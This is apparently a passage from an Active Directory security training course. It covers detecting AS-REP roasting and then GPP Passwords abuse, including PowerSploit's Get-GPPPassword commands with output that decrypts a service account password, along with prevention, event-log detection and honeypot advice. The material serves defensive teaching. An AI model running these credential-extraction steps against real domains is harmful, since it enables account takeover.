<img width="1746" height="159" alt="image" src="https://github.com/user-attachments/assets/87c26570-c186-4f28-81eb-306035443c90" />

Command output showing cracked password 'Slavi123' for user 'anni' from asrepcrack.txt.
Prevention



As mentioned before, the success of this attack depends on the strength of the password of users with Do not require Kerberos preauthentication configured.

First and foremost, we should only use this property if needed; a good practice is to review accounts quarterly to ensure that we have not assigned this property. Because this property is often found with some regular user accounts, they tend to have easier-to-crack passwords than service accounts with SPNs (those from Kerberoast). Therefore, for users requiring this configured, we should assign a separate password policy, which requires at least 20 characters to thwart cracking attempts.
Detection

When we executed Rubeus, an Event with ID 4768 was generated, signaling that a Kerberos Authentication ticket was generated:

<img width="1799" height="872" alt="image" src="https://github.com/user-attachments/assets/0baa0b4c-ccee-4ac3-8a16-ba158fb5271e" />

Security log Event 4768: Kerberos authentication ticket requested by user 'anni' from IP 172.16.18.25.

The caveat is that AD generates this event for every user that authenticates with Kerberos to any device; therefore, the presence of this event is very abundant. However, it is possible to know where the user authenticated from, which we can then use to correlate known good logins against potential malicious hash extractions. It may be hard to inspect specific IP addresses, especially if a user moves around office locations. However, it is possible to scrutinize the particular VLAN and alert on anything outside it.

Another field we should focus on is the Pre-Authentication Type, which holds information related to the type of request. Tools that take advantage of the "Do not require Kerberos preauthentication" option on a domain user account generate the 0 type in the event related to logon without Pre-Authentication. Commonly, these tools will target weak encryption types such as RC4 (0x17 within the Ticket Encryption Type field of the event. Rubeus defaults to using the RC4 encryption type, as we can see in the source code.
Honeypot

For this attack, a honeypot user is an excellent detection option to configure in AD environments; this must be a user with no real use/need in the environment, such that no login attempts are performed regularly. Therefore, any attempt(s) to perform a login for this account is likely malicious and requires inspection.

However, suppose the honeypot user is the only account with Kerberos Pre-Authentication not required. In that case, there might be better detection methods, as it would be very obvious for advanced threat actors that it is a honeypot user, resulting in them avoiding interactions with it. (I did previously hear from an organization that needed one of these accounts (application related) that the 'security through obscurity' behind having only one of these accounts may save them, as attackers will avoid going after it thinking it is a honeypot user. While it may be true in some instances, we should not let a glimpse of hope dictate the security state of the environment.)

To make a good honeypot user, we should ensure the following:

    The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).
    For a service account user, the password should ideally be over two years old. For regular users, maintain the password so it does not become older than one year.
    The account must have logins after the day the password was changed; otherwise, it becomes self-evident if the last password change day is the same as the previous login.
    The account must have some privileges assigned to it; otherwise, it won't be interesting to try to crack its password's hash.

If we go back to our playground environment and configure the user 'svc-iam' (presumably an old IAM account leftover) with the recommendations above, then any request to obtain a TGT for that account should be alerted on. The event received would look like this:


<img width="1261" height="1148" alt="image" src="https://github.com/user-attachments/assets/51d4d1a9-1a2c-4992-9cc3-2fceea860f33" />

Security log Event 4768: Kerberos ticket requested by 'svc-iam', IP 172.16.18.25. Alert: Honeypot triggered, suspicious device.


























 Section 5 / 16
Go to Questions
GPP Passwords
Description

SYSVOL is a network share on all Domain Controllers, containing logon scripts, group policy data, and other required domain-wide data. AD stores all group policies in \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\. When Microsoft released it with the Windows Server 2008, Group Policy Preferences (GPP) introduced the ability to store and use credentials in several scenarios, all of which AD stores in the policies directory in SYSVOL.

During engagements, we might encounter scheduled tasks and scripts executed under a particular user and contain the username and an encrypted version of the password in XML policy files. The encryption key that AD uses to encrypt the XML policy files (the same for all Active Directory environments) was released on Microsoft Docs, allowing anyone to decrypt credentials stored in the policy files. Anyone can decrypt the credentials because the SYSVOL folder is accessible to all 'Authenticated Users' in the domain, which includes users and computers. Microsoft published the AES private key on MSDN:

<img width="1514" height="634" alt="image" src="https://github.com/user-attachments/assets/40892b16-f722-4853-9c3a-49a53c088883" />

Password encryption using a 32-byte AES key: 4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b.


Also, as a reference, this is what an example XML file containing an encrypted password looks like (note that the property is called cpassword):

<img width="2025" height="287" alt="image" src="https://github.com/user-attachments/assets/2c97f1d1-9489-441e-8224-83569889d6e4" />

XML code showing user 'svc-iis' with encrypted password.
Attack


To abuse GPP Passwords, we will use the Get-GPPPassword function from PowerSploit, which automatically parses all XML files in the Policies folder in SYSVOL, picking up those with the cpassword property and decrypting them once detected:

        powershell-session
PS C:\Users\bob\Downloads> Import-Module .\Get-GPPPassword.ps1
PS C:\Users\bob\Downloads> Get-GPPPassword

UserName  : svc-iis
NewName   : [BLANK]
Password  : abcd@123
Changed   : [BLANK]
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{73C66DBB-81DA-44D8-BDEF-20BA2C27056D}\
            Machine\Preferences\Groups\Groups.xml
NodeName  : Groups
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80

<img width="1766" height="422" alt="image" src="https://github.com/user-attachments/assets/c0cf8faa-7727-4637-8e0a-a7e4319291ff" />

PowerShell output of Get-GPPPassword command showing username 'svc-iis' and password 'abcd@123'.
Prevention



Once the encryption key was made public and started to become abused, Microsoft released a patch (KB2962486) in 2014 to prevent caching credentials in GPP. Therefore, GPP should no longer store passwords in new patched environments. However, unfortunately, there are a multitude of Active Directory environments built after 2015, which for some reason, do contain credentials in SYSVOL. It is therefore highly recommended to continuously assess and review the environment to ensure that no credentials are exposed here.

It is crucial to know that if an organization built its AD environment before 2014, it is likely that its credentials are still cached because the patch does not clear existing stored credentials (only prevents the caching of new ones).
Detection

There are two detection techniques for this attack:

    Accessing the XML file containing the credentials should be a red flag if we are auditing file access; this is more realistic (due to volume otherwise) regarding detection if it is a dummy XML file, not associated with any GPO. In this case, there will be no reason for anyone to touch this file, and any attempt is likely suspicious. As demonstrated by Get-GPPPasswords, it parses all of the XML files in the Policies folder. For auditing, we can generate an event whenever a user reads the file:


<img width="1743" height="1138" alt="image" src="https://github.com/user-attachments/assets/bc67d20e-276e-41f1-844c-e8f8a2bce47d" />

Advanced Security Settings for Groups.xml showing auditing enabled for 'Everyone' with read and execute access. Any access generates an event.


Once auditing is enabled, any access to the file will generate an Event with the ID 4663:

<img width="1634" height="817" alt="image" src="https://github.com/user-attachments/assets/86367eb5-e9c0-4338-b9c7-19cf0e840751" />

Security log Event 4663: User 'bob' accessing Groups.xml with GPP credentials.

    Logon attempts (failed or successful, depending on whether the password is up to date) of the user whose credentials are exposed is another way of detecting the abuse of this attack; this should generate one of the events 4624 (successful logon), 4625 (failed logon), or 4768 (TGT requested). A successful logon with the account from our attack scenario would generate the following event on the Domain Controller:


<img width="1521" height="1078" alt="image" src="https://github.com/user-attachments/assets/e3d50f22-0c50-40cd-b0a2-d7a22dbccc25" />

Security log Event 4624: Successful logon for 'svc-iis' from IP 172.16.18.25. Note: IP correlation can determine if the event is legitimate or suspicious.


In the case of a service account, we may correlate logon attempts with the device from which the authentication attempt originates, as this should be easy to detect, assuming we know where certain accounts are used (primarily if the logon originated from a workstation, which is abnormal behavior for a service account).
Honeypot

This attack provides an excellent opportunity for setting up a trap: we can use a semi-privileged user with a wrong password. Service accounts provide a more realistic opportunity because:

    The password is usually expected to be old, without recent or regular modifications.
    It is easy to ensure that the last password change is older than when the GPP XML file was last modified. If the user's password is changed after the file was modified, then no adversary will attempt to login with this account (the password is likely no longer valid).
    Schedule the user to perform any dummy task to ensure that there are recent logon attempts.

When we do the above, we can configure an alert that if any successful or failed logon attempts occur with this service account, it must be malicious (assuming that we whitelist the dummy task logon that simulates the logon activity in the alert).

Because the provided password is wrong, we would primarily expect failed logon attempts. Three event IDs (4625, 4771, and 4776) can indicate this; here is how they look for our playground environment if an attacker is attempting to authenticate with a wrong password:

    **4625**
<img width="1515" height="1117" alt="image" src="https://github.com/user-attachments/assets/b5fc6ca1-48b4-449e-99de-21997d9cb8cd" />

Security log Event 4625: Failed logon for 'svc-iis' due to bad password from IP 172.16.18.20, indicating a potential attacker or compromised device.

    **4771**
<img width="1660" height="1125" alt="image" src="https://github.com/user-attachments/assets/6f019f62-6ccf-4821-ae59-a0867b6e2bff" />

Security log Event 4771: Failed pre-authentication for 'svc-iis' from IP 172.16.18.4. Failure code 0x18 indicates a wrong password.

    **4776**
    <img width="1040" height="478" alt="image" src="https://github.com/user-attachments/assets/e40eaab5-b46a-4b97-aa84-2d3fad83e009" />


Security log Event 4776: Failed credential validation for 'svc-iis' with error code 0xC000006A indicating a bad password.

